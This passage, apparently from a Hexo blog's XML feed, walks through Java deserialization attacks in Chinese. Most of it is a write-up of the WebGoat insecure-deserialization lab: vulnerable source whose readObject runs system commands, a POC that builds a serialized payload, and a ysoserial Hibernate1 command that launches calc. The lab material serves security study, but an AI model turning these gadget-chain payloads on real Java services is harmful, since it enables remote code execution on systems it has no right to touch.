hashCode方法计算时会在hashCode属性中缓存已经计算过的值，如果再次计算将直接返回值</span></span><br><span class="line">        <span class="comment">// put前，需要反射把hashCode的值修改（!=-1）</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put -&gt; URL中hashCode方法，hashCode值不等于-1就不会触发</span></span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode改为-1，反序列化时触发</span></span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(hashMap)));</span><br><span class="line">        deserialize(serialize(hashMap));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deserialize </tag>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化-WebGoat</title>
      <link href="/2023/11/10/java/base/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WebGoat/"/>
      <url>/2023/11/10/java/base/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WebGoat/</url>
      
        <content type="html"><![CDATA[<h2 id="Java反序列化-WebGoat"><a href="#Java反序列化-WebGoat" class="headerlink" title="Java反序列化-WebGoat"></a>Java反序列化-WebGoat</h2><p>源项目：webgoat-server-8.2.2（<a href="https://github.com/WebGoat/WebGoat/releases%EF%BC%89">https://github.com/WebGoat/WebGoat/releases）</a></p><p>Jdk：&gt;&#x3D;15（11不行）</p><p>启动命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webgoat-server-8.2.2.jar</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1:8080/WebGoat/login">http://127.0.0.1:8080/WebGoat/login</a></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231112185914293.png" alt="image-20231112185914293"></p><p>题目java文件：webgoat-server-8.2.2.jar 解包，webgoat-server-8.2.2&#x2F;BOOT-INF&#x2F;lib&#x2F;insecure-deserialization-8.2.2.jar再次解包，org&#x2F;org.owasp.webgoat.deserialization下的文件</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InsecureDeserializationTask</span></span><br><span class="line"><span class="keyword">package</span> org.owasp.webgoat.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.dummy.insecure.framework.VulnerableTaskHolder;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;insecure-deserialization.hints.1&quot;, &quot;insecure-deserialization.hints.2&quot;, &quot;insecure-deserialization.hints.3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDeserializationTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InsecureDeserializationTask</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/InsecureDeserialization/task&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String token)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64token</span> <span class="operator">=</span> token.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> before;</span><br><span class="line">        <span class="type">long</span> after;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            label71: &#123;</span><br><span class="line">                <span class="comment">// base64解码，通过字节流反序列化对象</span></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64token)));</span><br><span class="line"></span><br><span class="line">                AttackResult var10;</span><br><span class="line">                label64: &#123;</span><br><span class="line">                    label63: &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            before = System.currentTimeMillis();</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                            <span class="comment">// 类必须是VulnerableTaskHolder</span></span><br><span class="line">                            <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> VulnerableTaskHolder)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                                    var10 = <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.stringobject&quot;</span>).build();</span><br><span class="line">                                    <span class="keyword">break</span> label64;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                var10 = <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.wrongobject&quot;</span>).build();</span><br><span class="line">                                <span class="keyword">break</span> label63;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            after = System.currentTimeMillis();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ois.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable var11) &#123;</span><br><span class="line">                                var12.addSuppressed(var11);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">throw</span> var12;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        ois.close();</span><br><span class="line">                        <span class="keyword">break</span> label71;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ois.close();</span><br><span class="line">                    <span class="keyword">return</span> var10;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ois.close();</span><br><span class="line">                <span class="keyword">return</span> var10;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidClassException var13) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.invalidversion&quot;</span>).build();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var14) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.expired&quot;</span>).build();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.invalidversion&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">delay</span> <span class="operator">=</span> (<span class="type">int</span>)(after - before);</span><br><span class="line">        <span class="keyword">if</span> (delay &gt; <span class="number">7000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> delay &lt; <span class="number">3000</span> ? <span class="built_in">this</span>.failed(<span class="built_in">this</span>).build() : <span class="built_in">this</span>.success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要Java序列化的类为VulnerableTaskHolder，跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VulnerableTaskHolder</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(VulnerableTaskHolder.class);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String taskName;</span><br><span class="line">    <span class="keyword">private</span> String taskAction;  <span class="comment">// taskAction字符串</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">        <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">        <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;VulnerableTaskHolder [taskName=&quot;</span> + <span class="built_in">this</span>.taskName + <span class="string">&quot;, taskAction=&quot;</span> + <span class="built_in">this</span>.taskAction + <span class="string">&quot;, requestedExecutionTime=&quot;</span> + <span class="built_in">this</span>.requestedExecutionTime + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写了readObject</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        log.info(<span class="string">&quot;restoring task: &#123;&#125;&quot;</span>, <span class="built_in">this</span>.taskName);</span><br><span class="line">        log.info(<span class="string">&quot;restoring time: &#123;&#125;&quot;</span>, <span class="built_in">this</span>.requestedExecutionTime);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.requestedExecutionTime != <span class="literal">null</span> &amp;&amp; (<span class="built_in">this</span>.requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(<span class="number">10L</span>)) || <span class="built_in">this</span>.requestedExecutionTime.isAfter(LocalDateTime.now()))) &#123;</span><br><span class="line">            log.debug(<span class="built_in">this</span>.toString());</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;outdated&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// taskAction满足以sleep或ping开头且长度小于22时，就会将taskAction中的内容以系统命令来执行</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">this</span>.taskAction.startsWith(<span class="string">&quot;sleep&quot;</span>) || <span class="built_in">this</span>.taskAction.startsWith(<span class="string">&quot;ping&quot;</span>)) &amp;&amp; <span class="built_in">this</span>.taskAction.length() &lt; <span class="number">22</span>) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;about to execute: &#123;&#125;&quot;</span>, <span class="built_in">this</span>.taskAction);</span><br><span class="line">                <span class="comment">// 执行（Runtime）</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="built_in">this</span>.taskAction);</span><br><span class="line">                    <span class="comment">// 从进程的标准输出流中读取数据</span></span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">                    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 这个循环会逐行读取进程的标准输出，并将每一行打印到控制台</span></span><br><span class="line">                    <span class="keyword">while</span>((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        log.info(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">                    log.error(<span class="string">&quot;IO Exception&quot;</span>, var5);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>VulnerableTaskHolder中不需要的删掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VulnerableTaskHolder</span></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String taskName;</span><br><span class="line">    <span class="keyword">private</span> String taskAction;</span><br><span class="line">    <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName,String taskAction)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">        <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">        <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>package需要相同，不然会造成Serializable ID不一致</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc</span></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vth</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;sleep 5&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(vth);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">byte</span>[] exploit = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(exploit);</span><br><span class="line">        System.out.println(<span class="string">&quot;payload=&quot;</span> + payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><h4 id="hibernate-core-5-4-28-Final-jar"><a href="#hibernate-core-5-4-28-Final-jar" class="headerlink" title="hibernate-core-5.4.28.Final.jar"></a>hibernate-core-5.4.28.Final.jar</h4><p>将文件 hibernate-core-5.4.28.Final.jar 放在和 ysoserial-all.jar 同一个目录，弹计算器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java8 -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar;ysoserial-all.jar ysoserial.GeneratePayload Hibernate1 calc &gt; poc.bin</span><br></pre></td></tr></table></figure><p>装个多个Java版本，java8是修改了java执行文件名</p><h4 id="bin转16进制和base64"><a href="#bin转16进制和base64" class="headerlink" title="bin转16进制和base64"></a>bin转16进制和base64</h4><p><strong>python</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span>(file + <span class="string">&quot;:&quot;</span> + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;16进制格式为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f.<span class="built_in">hex</span>() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f_b64 = base64.b64encode(f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;base64格式为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(f_b64) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    out(<span class="string">&quot;poc.bin&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileConversion</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;ser.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">hexString</span> <span class="operator">=</span> bytesToHex(fileBytes);</span><br><span class="line">            System.out.println(filePath + <span class="string">&quot;:\n16进制格式为：\n&quot;</span> + hexString);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">            System.out.println(<span class="string">&quot;Base64格式为：\n&quot;</span> + base64String);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            hexString.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化原理</title>
      <link href="/2023/10/17/java/base/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
